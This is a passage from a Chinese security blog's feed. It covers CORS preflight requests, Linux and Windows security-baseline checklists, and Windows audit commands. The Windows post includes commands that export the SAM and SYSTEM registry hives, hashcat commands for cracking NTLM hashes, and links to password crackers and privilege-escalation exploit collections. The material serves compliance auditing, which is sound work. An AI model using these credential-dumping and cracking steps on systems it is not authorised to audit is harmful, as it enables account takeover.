title="非简单请求"></a>非简单请求</h2><p>非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者<strong>Content-Type</strong>字段的类型是<strong>application/json</strong>。</p><p>非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求（preflight）。</p><p>浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的<strong>XMLHttpRequest</strong>请求，否则就报错。</p><p>下面是一段浏览器的JavaScript脚本。</p><pre><code>var url = &apos;http://api.alice.com/cors&apos;;var xhr = new XMLHttpRequest();xhr.open(&apos;PUT&apos;, url, true);xhr.setRequestHeader(&apos;X-Custom-Header&apos;, &apos;value&apos;);xhr.send();</code></pre><p>上面代码中，HTTP请求的方法是PUT，并且发送一个自定义头信息<strong>X-Custom-Header</strong>。</p><p>浏览器发现，这是一个非简单请求，就自动发出一个”预检”请求，要求服务器确认可以这样请求。下面是这个”预检”请求的HTTP头信息。</p><pre><code>OPTIONS /cors HTTP/1.1Origin: http://api.bob.comAccess-Control-Request-Method: PUTAccess-Control-Request-Headers: X-Custom-HeaderHost: api.alice.comAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0...</code></pre><p>“预检”请求用的请求方法是<strong>OPTIONS</strong>，表示这个请求是用来询问的。头信息里面，关键字段是<strong>Origin</strong>，表示请求来自哪个源。</p><p>除了<strong>Origin</strong>字段，”预检”请求的头信息包括两个特殊字段。</p><h3 id="（1）Access-Control-Request-Method"><a href="#（1）Access-Control-Request-Method" class="headerlink" title="（1）Access-Control-Request-Method"></a>（1）Access-Control-Request-Method</h3><p>该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。</p><h3 id="（2）Access-Control-Request-Headers"><a href="#（2）Access-Control-Request-Headers" class="headerlink" title="（2）Access-Control-Request-Headers"></a>（2）Access-Control-Request-Headers</h3><p>该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。</p><h3 id="预检请求的回应"><a href="#预检请求的回应" class="headerlink" title="预检请求的回应"></a>预检请求的回应</h3><p>服务器收到”预检”请求以后，检查了<strong>Origin</strong>、<strong>Access-Control-Request-Method</strong>和<strong>Access-Control-Request-Headers</strong>字段以后，确认允许跨源请求，就可以做出回应。</p><pre><code>HTTP/1.1 200 OKDate: Mon, 01 Dec 2008 01:15:39 GMTServer: Apache/2.0.61 (Unix)Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Methods: GET, POST, PUTAccess-Control-Allow-Headers: X-Custom-HeaderContent-Type: text/html; charset=utf-8Content-Encoding: gzipContent-Length: 0Keep-Alive: timeout=2, max=100Connection: Keep-AliveContent-Type: text/plain</code></pre><p>上面的HTTP回应中，关键的是<strong>Access-Control-Allow-Origin</strong>字段，表示<code>http://api.bob.com</code>可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。</p><p>如果浏览器否定了”预检”请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。</p><pre><code>XMLHttpRequest cannot load http://api.alice.com.Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.</code></pre><p>服务器回应的其他CORS相关字段如下。</p><pre><code>Access-Control-Allow-Methods: GET, POST, PUTAccess-Control-Allow-Headers: X-Custom-HeaderAccess-Control-Allow-Credentials: trueAccess-Control-Max-Age: 1728000</code></pre><h3 id="（1）Access-Control-Allow-Methods"><a href="#（1）Access-Control-Allow-Methods" class="headerlink" title="（1）Access-Control-Allow-Methods"></a>（1）Access-Control-Allow-Methods</h3><p>该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次”预检”请求。</p><h3 id="（2）Access-Control-Allow-Headers"><a href="#（2）Access-Control-Allow-Headers" class="headerlink" title="（2）Access-Control-Allow-Headers"></a>（2）Access-Control-Allow-Headers</h3><p>如果浏览器请求包括<strong>Access-Control-Request-Headers</strong>字段，则<strong>Access-Control-Allow-Headers</strong>字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在”预检”中请求的字段。</p><h3 id="（3）Access-Control-Allow-Credentials"><a href="#（3）Access-Control-Allow-Credentials" class="headerlink" title="（3）Access-Control-Allow-Credentials"></a>（3）Access-Control-Allow-Credentials</h3><p>该字段与简单请求时的含义相同。</p><h3 id="（4）Access-Control-Max-Age"><a href="#（4）Access-Control-Max-Age" class="headerlink" title="（4）Access-Control-Max-Age"></a>（4）Access-Control-Max-Age</h3><p>该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。</p><h3 id="浏览器的正常请求和回应"><a href="#浏览器的正常请求和回应" class="headerlink" title="浏览器的正常请求和回应"></a>浏览器的正常请求和回应</h3><p>一旦服务器通过了”预检”请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个<strong>Origin</strong>头信息字段。服务器的回应，也都会有一个<strong>Access-Control-Allow-Origin</strong>头信息字段。</p><p>下面是”预检”请求之后，浏览器的正常CORS请求。</p><pre><code>PUT /cors HTTP/1.1Origin: http://api.bob.comHost: api.alice.comX-Custom-Header: valueAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0...</code></pre><p>上面头信息的<strong>Origin</strong>字段是浏览器自动添加的。</p><p>下面是服务器正常的回应。</p><pre><code>Access-Control-Allow-Origin: http://api.bob.comContent-Type: text/html; charset=utf-8</code></pre><p>上面头信息中，<strong>Access-Control-Allow-Origin</strong>字段是每次回应都必定包含的。</p><h1 id="与JSONP的比较"><a href="#与JSONP的比较" class="headerlink" title="与JSONP的比较"></a>与JSONP的比较</h1><p>CORS与JSONP的使用目的相同，但是比JSONP更强大。</p><p>JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。&lt;/p&gt;
&lt;p&gt;它允许浏览器向跨源服务器，发出&lt;code&gt;XMLHttpRequest&lt;/code&gt;请求，从而克服了AJAX只能&lt;strong&gt;同源&lt;/stron
      
    
    </summary>
    
      <category term="SSRF" scheme="http://yoursite.com/categories/SSRF/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux系统配置安全</title>
    <link href="http://yoursite.com/2018/12/18/Linux%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E5%AE%89%E5%85%A8/"/>
    <id>http://yoursite.com/2018/12/18/Linux系统配置安全/</id>
    <published>2018-12-18T09:42:10.000Z</published>
    <updated>2018-12-18T13:34:58.588Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux系统安全基线"><a href="#Linux系统安全基线" class="headerlink" title="Linux系统安全基线"></a>Linux系统安全基线</h1><h2 id="检测操作系统是否安装最新补丁"><a href="#检测操作系统是否安装最新补丁" class="headerlink" title="检测操作系统是否安装最新补丁"></a>检测操作系统是否安装最新补丁</h2><ul><li>操作系统长时间不更新易导致系统上存在较多的高中危漏洞。</li></ul><h2 id="检查操作系统是否修改banner"><a href="#检查操作系统是否修改banner" class="headerlink" title="检查操作系统是否修改banner"></a>检查操作系统是否修改banner</h2><ul><li>默认banner本地或远程登陆时候会显示当前操作系统的版本、内核版本等信息，造成系统信息泄露。</li></ul><h2 id="检查操作系统是否存在与系统无关账户"><a href="#检查操作系统是否存在与系统无关账户" class="headerlink" title="检查操作系统是否存在与系统无关账户"></a>检查操作系统是否存在与系统无关账户</h2><ul><li>UID为0的账户拥有超级管理员权限，系统除root用户外不应存在其他UID为0的用户。操作系统存在多个与系统无关的用户，易导致账户信息泄露等问题。</li></ul><h2 id="Linux系统安全基线-1"><a href="#Linux系统安全基线-1" class="headerlink" title="Linux系统安全基线"></a>Linux系统安全基线</h2><h3 id="检查操作系统是否存在空口令和脆弱性口令账户"><a href="#检查操作系统是否存在空口令和脆弱性口令账户" class="headerlink" title="检查操作系统是否存在空口令和脆弱性口令账户"></a>检查操作系统是否存在空口令和脆弱性口令账户</h3><ul><li>空口令账户不需要密码即可登录或容易被攻击者猜到，存在系统非授权访问的威胁。</li></ul><h3 id="检查操作系统是否配置口令策略和口令复杂度"><a href="#检查操作系统是否配置口令策略和口令复杂度" class="headerlink" title="检查操作系统是否配置口令策略和口令复杂度"></a>检查操作系统是否配置口令策略和口令复杂度</h3><ul><li>未设置合理的密码策略可能导致用户使用弱口令。</li></ul><h3 id="检查操作系统是否配置登录失败处理功能"><a href="#检查操作系统是否配置登录失败处理功能" class="headerlink" title="检查操作系统是否配置登录失败处理功能"></a>检查操作系统是否配置登录失败处理功能</h3><ul><li>未设置合理的账户锁定策略易导致系统密码被暴力破解等问题。</li></ul><h3 id="检查操作系统是否开启了不必要的服务"><a href="#检查操作系统是否开启了不必要的服务" class="headerlink" title="检查操作系统是否开启了不必要的服务"></a>检查操作系统是否开启了不必要的服务</h3><ul><li>根据最小化安装原则，系统应关闭不必要的服务，这些服务可以被恶意用户利用，曹诚阻断连接和利用特殊账号破坏系统等影响。</li></ul><h3 id="检查操作系统是否开启了Telnet协议远程登录"><a href="#检查操作系统是否开启了Telnet协议远程登录" class="headerlink" title="检查操作系统是否开启了Telnet协议远程登录"></a>检查操作系统是否开启了Telnet协议远程登录</h3><ul><li>Telnet采用明文传输协议，才传输过程中易被截取或篡改。</li></ul><h3 id="检查操作系统是否限制root用户远程登录"><a href="#检查操作系统是否限制root用户远程登录" class="headerlink" title="检查操作系统是否限制root用户远程登录"></a>检查操作系统是否限制root用户远程登录</h3><ul><li>未限制超级管理员用户远程登录易导致在非授权人员获得超级管理员口令是可远程登录操作系统。</li></ul><h3 id="检查操作系统是否显示su命令使用策略"><a href="#检查操作系统是否显示su命令使用策略" class="headerlink" title="检查操作系统是否显示su命令使用策略"></a>检查操作系统是否显示su命令使用策略</h3><ul><li>未设置su命令的使用策略可能导致普通用户在得到root用户密码后可以切换到root用户。</li></ul><h3 id="检查操作系统是否限制可登录服务器的IP地址"><a href="#检查操作系统是否限制可登录服务器的IP地址" class="headerlink" title="检查操作系统是否限制可登录服务器的IP地址"></a>检查操作系统是否限制可登录服务器的IP地址</h3><ul><li>进行终端访问地址的限定使得网络内其他用户也可以访问不该访问的服务器。</li></ul><h3 id="检查操作系统是否配置超时锁定时间"><a href="#检查操作系统是否配置超时锁定时间" class="headerlink" title="检查操作系统是否配置超时锁定时间"></a>检查操作系统是否配置超时锁定时间</h3><ul><li>没有设置超时锁定时间可能在管理员忘记锁定机器的情况下被非法攻击。</li></ul><h3 id="检查操作系统是否合理设置重要配置文件权限"><a href="#检查操作系统是否合理设置重要配置文件权限" class="headerlink" title="检查操作系统是否合理设置重要配置文件权限"></a>检查操作系统是否合理设置重要配置文件权限</h3><ul><li>不合理的权限易导致系统重要配置文件被非授权访问或篡改。</li></ul><h3 id="检查操作系统是否控制用户缺省访问权限"><a href="#检查操作系统是否控制用户缺省访问权限" class="headerlink" title="检查操作系统是否控制用户缺省访问权限"></a>检查操作系统是否控制用户缺省访问权限</h3><ul><li>umask的默认设置一般为022，这给新创建的文件默认权限755（777-022=755），这会给文件所有者读、写权限，但只给组成员和其他用户读权限。</li></ul><h3 id="检查操作系统是否开启审计功能，并配置审计策略"><a href="#检查操作系统是否开启审计功能，并配置审计策略" class="headerlink" title="检查操作系统是否开启审计功能，并配置审计策略"></a>检查操作系统是否开启审计功能，并配置审计策略</h3><ul><li>不完善的审计记录会导致对于系统操作事件记录不完全，当系统安全事件发生时，无法及时追踪到具体操作。</li></ul><h3 id="检查操作系统是否开启日志功能，并配置日志策略"><a href="#检查操作系统是否开启日志功能，并配置日志策略" class="headerlink" title="检查操作系统是否开启日志功能，并配置日志策略"></a>检查操作系统是否开启日志功能，并配置日志策略</h3><ul><li>不完善的日志功能不利于系统安全问题的追踪。</li></ul><h3 id="检查操作系统是否设置审计文件和日志文件权限"><a href="#检查操作系统是否设置审计文件和日志文件权限" class="headerlink" title="检查操作系统是否设置审计文件和日志文件权限"></a>检查操作系统是否设置审计文件和日志文件权限</h3><ul><li>易导致用户入侵操作记录被清理。</li></ul><h3 id="检查操作系统是否限制单个用户使用资源限度"><a href="#检查操作系统是否限制单个用户使用资源限度" class="headerlink" title="检查操作系统是否限制单个用户使用资源限度"></a>检查操作系统是否限制单个用户使用资源限度</h3><ul><li>不对单个用户使用资源进行限制可能导致单个用户操作（例如执行死循环）耗尽资源。</li></ul><h1 id="提权漏洞合集"><a href="#提权漏洞合集" class="headerlink" title="提权漏洞合集"></a>提权漏洞合集</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><ul><li><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></li></ul><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><ul><li><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a></li></ul><h2 id="Exploits-Dtatbase"><a href="#Exploits-Dtatbase" class="headerlink" title="Exploits Dtatbase"></a>Exploits Dtatbase</h2><ul><li><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Linux系统安全基线&quot;&gt;&lt;a href=&quot;#Linux系统安全基线&quot; class=&quot;headerlink&quot; title=&quot;Linux系统安全基线&quot;&gt;&lt;/a&gt;Linux系统安全基线&lt;/h1&gt;&lt;h2 id=&quot;检测操作系统是否安装最新补丁&quot;&gt;&lt;a href=&quot;#检测操
      
    
    </summary>
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows系统配置安全</title>
    <link href="http://yoursite.com/2018/12/18/Windows%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E5%AE%89%E5%85%A8/"/>
    <id>http://yoursite.com/2018/12/18/Windows系统配置安全/</id>
    <published>2018-12-18T03:47:36.000Z</published>
    <updated>2018-12-18T09:24:12.686Z</updated>
    
    <content type="html"><![CDATA[<h1 id="操作系统安全基线"><a href="#操作系统安全基线" class="headerlink" title="操作系统安全基线"></a>操作系统安全基线</h1><p>服务器安全基线是为了满足安全规范要求，服务器必须要达到的安全最低标准。</p><h2 id="主要作用："><a href="#主要作用：" class="headerlink" title="主要作用："></a>主要作用：</h2><ul><li>设置口令复杂度策略，防止暴力破解密码。</li><li>控制用户或文件权限，减少被攻击后的影响。</li><li>最小化安装操作系统，防止不必要的服务带来的安全问题。</li></ul><h2 id="基线范围"><a href="#基线范围" class="headerlink" title="基线范围"></a>基线范围</h2><ul><li>操作系统</li><li>网络设备</li><li>数据库</li><li>中间件</li></ul><h1 id="Windows系统配置安全"><a href="#Windows系统配置安全" class="headerlink" title="Windows系统配置安全"></a>Windows系统配置安全</h1><h2 id="账户管理"><a href="#账户管理" class="headerlink" title="账户管理"></a>账户管理</h2><h3 id="多用户系统"><a href="#多用户系统" class="headerlink" title="多用户系统"></a>多用户系统</h3><ul><li>Windows不应只有一个管理员用户，应根据业务需求，设定不同的用户和用户组，如管理员用户、Web用户、数据库用户等。</li></ul><h3 id="定期检查用户，删除无用、过期的账户"><a href="#定期检查用户，删除无用、过期的账户" class="headerlink" title="定期检查用户，删除无用、过期的账户"></a>定期检查用户，删除无用、过期的账户</h3><ul><li>应保证所有用户均为有效且在用。</li></ul><h3 id="禁用Guest用户"><a href="#禁用Guest用户" class="headerlink" title="禁用Guest用户"></a>禁用Guest用户</h3><ul><li>系统应禁用Guest账户，Guest账户默认不开启。</li></ul><h3 id="更改默认管理员账户名称"><a href="#更改默认管理员账户名称" class="headerlink" title="更改默认管理员账户名称"></a>更改默认管理员账户名称</h3><ul><li>应更改默认的管理员名称administrator，防止暴力破解等问题。</li></ul><h3 id="不显示最后的用户名"><a href="#不显示最后的用户名" class="headerlink" title="不显示最后的用户名"></a>不显示最后的用户名</h3><ul><li>用户登出后，下次登陆时，不应显示登录名称</li></ul><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><ul><li>控制面板-&gt;系统和安全-&gt;管理工具-&gt;计算机管理</li><li>控制面板-&gt;系统和安全-&gt;管理工具-&gt;本地安全策略</li></ul><h2 id="密码策略"><a href="#密码策略" class="headerlink" title="密码策略"></a>密码策略</h2><h3 id="密码复杂度"><a href="#密码复杂度" class="headerlink" title="密码复杂度"></a>密码复杂度</h3><ul><li>应启用密码策略，根据规范设置密码长度、复杂度等选项。</li></ul><h3 id="更换密码周期"><a href="#更换密码周期" class="headerlink" title="更换密码周期"></a>更换密码周期</h3><ul><li>应定期更改静态口令，建议不超过90天。</li></ul><h3 id="用户锁定策略"><a href="#用户锁定策略" class="headerlink" title="用户锁定策略"></a>用户锁定策略</h3><ul><li>应配置账户锁定策略，防止暴力破解攻击。</li></ul><h3 id="检测方法-1"><a href="#检测方法-1" class="headerlink" title="检测方法"></a>检测方法</h3><ul><li>控制面板-&gt;系统和安全-&gt;管理工具-&gt;计算机管理-&gt;用户策略</li></ul><h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><h3 id="远程关机"><a href="#远程关机" class="headerlink" title="远程关机"></a>远程关机</h3><ul><li>应只有管理员用户可以远程关闭操作系统。</li></ul><h3 id="本地关机"><a href="#本地关机" class="headerlink" title="本地关机"></a>本地关机</h3><ul><li>只有管理员用户可以本地关闭操作系统。</li></ul><h3 id="用户权限指派"><a href="#用户权限指派" class="headerlink" title="用户权限指派"></a>用户权限指派</h3><ul><li>取得文件或其他对象的所有权限应只分配给administrators组</li></ul><h3 id="授权用户登录"><a href="#授权用户登录" class="headerlink" title="授权用户登录"></a>授权用户登录</h3><ul><li>配置指定授权用户允许本地登陆此计算机。</li></ul><h3 id="授权账户从网络访问"><a href="#授权账户从网络访问" class="headerlink" title="授权账户从网络访问"></a>授权账户从网络访问</h3><ul><li>只允许授权账号从网络访问（包括网络共享等，但不包括终端服务）此计算机。</li></ul><h3 id="禁用未登录前关机"><a href="#禁用未登录前关机" class="headerlink" title="禁用未登录前关机"></a>禁用未登录前关机</h3><ul><li>如果启用此设置，服务器安全性将会大大降低，给远程连接的黑客可乘之机，所以建议禁用未登录前关机功能</li></ul><h3 id="检测方法-2"><a href="#检测方法-2" class="headerlink" title="检测方法"></a>检测方法</h3><ul><li>控制面板-&gt;系统和安全-&gt;管理工具-&gt;本地安全策略-&gt;本地策略</li></ul><h2 id="日志审计"><a href="#日志审计" class="headerlink" title="日志审计"></a>日志审计</h2><h3 id="设置日志文件大小"><a href="#设置日志文件大小" class="headerlink" title="设置日志文件大小"></a>设置日志文件大小</h3><ul><li>设置应用日志文件大小至少为8192KB，可根据磁盘空间配置日志文件大小，记录的日志越多越好。</li><li>设置当达到最大的日志尺寸时，按需要轮询记录日志。</li></ul><h3 id="检测方法-3"><a href="#检测方法-3" class="headerlink" title="检测方法"></a>检测方法</h3><ul><li>控制面板-&gt;系统和安全-&gt;管理工具-&gt;本地安全策略-&gt;本地策略-&gt;审核策略</li><li>控制面板-&gt;系统和安全-&gt;管理工具-&gt;事件查看器-&gt;windows日志，查看应用日志、系统日志、安全日志属性中的日志大小，并根据安全策略设置达到日志最大大小时的操作。</li></ul><h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><h3 id="关闭默认共享"><a href="#关闭默认共享" class="headerlink" title="关闭默认共享"></a>关闭默认共享</h3><ul><li>非域环境中，关闭Windows硬盘默认共享，例如C$,D$</li></ul><h3 id="设置共享文件夹权限"><a href="#设置共享文件夹权限" class="headerlink" title="设置共享文件夹权限"></a>设置共享文件夹权限</h3><ul><li>每个共享文件夹的共享权限，只允许授权的账户拥有共享此文件夹的权限。</li></ul><h3 id="检测方法-4"><a href="#检测方法-4" class="headerlink" title="检测方法"></a>检测方法</h3><ul><li>打开cmd，输入net share查看当前共享</li><li>控制面板-&gt;系统和安全-&gt;管理工具-&gt;计算机管理-&gt;共享文件夹，查看每个共享文件夹权限。</li></ul><h2 id="最小化安装"><a href="#最小化安装" class="headerlink" title="最小化安装"></a>最小化安装</h2><p>根据业务需求，禁用不必要的服务，删除不必要的文件</p><h2 id="其他设置"><a href="#其他设置" class="headerlink" title="其他设置"></a>其他设置</h2><ul><li>应安装防病毒软件，确保病毒库及时更新。</li><li>设置从屏幕保护恢复时需要输入密码，并将屏幕保护自动开启时间设定为五分钟。</li><li>对于远程登录的账户，设置不活动超过时间15分钟地洞断开连接。</li><li>关闭自动播放功能，防止自动运行恶意程序。</li><li>无特殊需求应该关闭远程桌面。</li><li>无特殊需求应该关闭远程协助。</li><li>开启windows防火墙，对进出站规则进行限制。</li></ul><h1 id="检测脚本编写"><a href="#检测脚本编写" class="headerlink" title="检测脚本编写"></a>检测脚本编写</h1><h2 id="检测用户相关"><a href="#检测用户相关" class="headerlink" title="检测用户相关"></a>检测用户相关</h2><pre><code>net user        //查看系统用户net user college        //查看具体用户信息net localgroup        //查看用户组net localgroup Administrators        //查看Administrators用户组net localgroup Guests        //查看Guests用户组</code></pre><h2 id="本地策略"><a href="#本地策略" class="headerlink" title="本地策略"></a>本地策略</h2><pre><code>secedit /export /cfg C:\temp.txt </code></pre><p>导出本地安全策略到<code>c:\temp.txt</code>中 </p><p>密码复杂度、更改密码周期(0表示禁用，1表示启用)</p><pre><code>PasswordComplexity        //密码必须符合复杂性要求MinimumPasswordLength        //密码长度最小值MinimumPasswordAge        //密码最短使用期限MaximumPasswordAge        //密码最长使用期限PasswordHistorySize        //强制密码历史</code></pre><p>账户锁定策略(无结果表示未开启）</p><pre><code>LockoutDuration        //账户锁定时间LockoutBadCount        //账户锁定阈值</code></pre><p>审核策略(0表示无审核，1表示成功审核，2表示失败审核，3表示成功和失败审核)</p><pre><code>AuditAccountManage        //审核帐户管理AuditAccountLogon        //审核帐户登录事件AuditSystemEvents        //审核系统事件AuditDSAccess        //审核目录服务访问AuditProcessTracking        //审核过程跟踪AuditPrivilegeUse        //审核特权使用AuditObjectAccess        //审核对象访问AuditLogonEvents        //审核登录事件AuditPolicyChange        //审核策略更改</code></pre><p>安全选项（0表示已停用，1表示已启用）</p><pre><code>AutoDisconnect        //在挂起会话之前所需的空闲时间DontDisplayLastUserName        //不显示上次登录的用户名ClearPageFileAtShutdown        //关机前清理虚拟内存页面ShutdownWithoutLogon        //允许在未登录前关机</code></pre><p>用户权利分配（Everyone:S-1-1-0 Administrators:S-1-5-32-544 Users:S-1-5-32-545 Power Users:S-1-5-32-547 Backup Operators:*S-1-5-32-551）</p><pre><code>SeRemoteShutdownPrivilege        //从远程系统强制关机SeTakeOwnershipPrivilege        //取得文件或其他对象所有权SeInteractiveLogonRight        //从本地登录此计算机SeRemoteInteractiveLogonRight        //允许通过远程桌面服务登录SeDebugPrivilege        //调试程序SeSystemtimePrivilege        //更改系统时间SeSecurityPrivilege        //管理审核和安全日志</code></pre><p>最后删除C盘中的临时文件</p><pre><code>del C:\temp.txt</code></pre><h2 id="注册表信息"><a href="#注册表信息" class="headerlink" title="注册表信息"></a>注册表信息</h2><p>是否开启屏保（0关，1开）</p><pre><code>reg query &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveActive |find &quot;ScreenSaveActive&quot;</code></pre><p>屏保时间（单位秒）</p><pre><code>reg query &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveTimeOut |find &quot;ScreenSaveTimeOut&quot;</code></pre><p>屏保恢复时使用密码保护（0否，1是）</p><pre><code>reg query &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaverIsSecure |find &quot;ScreenSaverIsSecure&quot;</code></pre><p>防火墙状态（1开，0关）</p><pre><code>reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SharedAccess\Parameters\FirewallPolicy\StandardProfile /v EnableFirewall |find &quot;EnableFirewall&quot;</code></pre><p>远程桌面(0开，1关)</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections |find &quot;fDenyTSConnections&quot;</code></pre><p>3389端口(d3d:3389)</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber |find &quot;PortNumber&quot;</code></pre><p>远程协助(0关（合规），1开</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Remote Assistance&quot; /v fAllowToGetHelp |find &quot;fAllowToGetHelp&quot;</code></pre><p>应用日志文件大小（0x2800000以上为合规）</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\Application&quot; /v MaxSize |find &quot;MaxSize&quot;</code></pre><p>达到事件日志最大大小时（不存在或0均合规）</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\Application&quot; /v Retention |find &quot;Retention&quot;</code></pre><p>安全日志文件大小（0x2800000以上为合规）</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\Security&quot; /v MaxSize |find &quot;MaxSize&quot;</code></pre><p>达到事件日志最大大小时（不存在或0均合规）</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\Security&quot; /v Retention |find &quot;Retention&quot;</code></pre><p>系统日志文件大小（0x2800000以上为合规）</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\System&quot; /v MaxSize |find &quot;MaxSize&quot;</code></pre><p>达到事件日志最大大小时（不存在或0均合规）</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Eventlog\System&quot; /v Retention |find &quot;Retention&quot;</code></pre><p>分区共享（存在且为0，为合规）</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters&quot; /v AutoShareServer |find &quot;AutoShareServer&quot;</code></pre><p>ADMIN共享（存在且为0，为合规）</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters&quot; /v AutoShareWks |find &quot;AutoShareWks&quot;</code></pre><p>IPC共享（存在且为1，为合规）</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa&quot; /v restrictanonymous |find &quot;restrictanonymous&quot;</code></pre><p>共享列表</p><pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\lanmanserver\shares&quot;</code></pre><p>软件列表</p><pre><code>reg query HKLM\SOFTWARE</code></pre><h2 id="共享信息"><a href="#共享信息" class="headerlink" title="共享信息"></a>共享信息</h2><p>默认共享</p><pre><code>net share</code></pre><h2 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h2><p>系统服务</p><pre><code>net start</code></pre><p>系统进程</p><pre><code>tasklist</code></pre><p>系统信息</p><pre><code>systeminfo</code></pre><h2 id="口令检测"><a href="#口令检测" class="headerlink" title="口令检测"></a>口令检测</h2><p>导出SAM</p><pre><code>reg save hklm\sam %IPaddress%.samreg save hklm\system %IPaddress%.system</code></pre><h2 id="更新日志检测"><a href="#更新日志检测" class="headerlink" title="更新日志检测"></a>更新日志检测</h2><p>在更新日志中查看最后更新日期</p><pre><code>C:\Windows\WindowsUpdate.log</code></pre><h2 id="分析脚本编写"><a href="#分析脚本编写" class="headerlink" title="分析脚本编写"></a>分析脚本编写</h2><h3 id="Windows密码破解"><a href="#Windows密码破解" class="headerlink" title="Windows密码破解"></a>Windows密码破解</h3><p>CMD5</p><p><a href="https://www.cmd5.com/" target="_blank" rel="noopener">https://www.cmd5.com/</a></p><p>Ophcrack</p><p><a href="https://www.objectif-securite.ch/ophcrack.php" target="_blank" rel="noopener">https://www.objectif-securite.ch/ophcrack.php</a></p><p>hashcat</p><pre><code>hashcat64.exe -m 1000 -a 0 Winhash.txt pass.txt hashcat64.exe -m 1000 -a 0 Winhash.txt pass.txt --show</code></pre><h1 id="反病毒测试"><a href="#反病毒测试" class="headerlink" title="反病毒测试"></a>反病毒测试</h1><p><a href="https://www.virustotal.com" target="_blank" rel="noopener">https://www.virustotal.com</a></p><p><a href="http://r.virscan.org/" target="_blank" rel="noopener">http://r.virscan.org/</a></p><p><a href="https://s.threatbook.cn/" target="_blank" rel="noopener">https://s.threatbook.cn/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;操作系统安全基线&quot;&gt;&lt;a href=&quot;#操作系统安全基线&quot; class=&quot;headerlink&quot; title=&quot;操作系统安全基线&quot;&gt;&lt;/a&gt;操作系统安全基线&lt;/h1&gt;&lt;p&gt;服务器安全基线是为了满足安全规范要求，服务器必须要达到的安全最低标准。&lt;/p&gt;
&lt;h2 id
      
    
    </summary>
    
      <category term="windows" scheme="http://yoursite.com/categories/windows/"/>
    
    
  </entry>
  
  <entry>
    <title>入门CTF</title>
    <link href="http://yoursite.com/2018/12/18/%E5%85%A5%E9%97%A8CTF/"/>
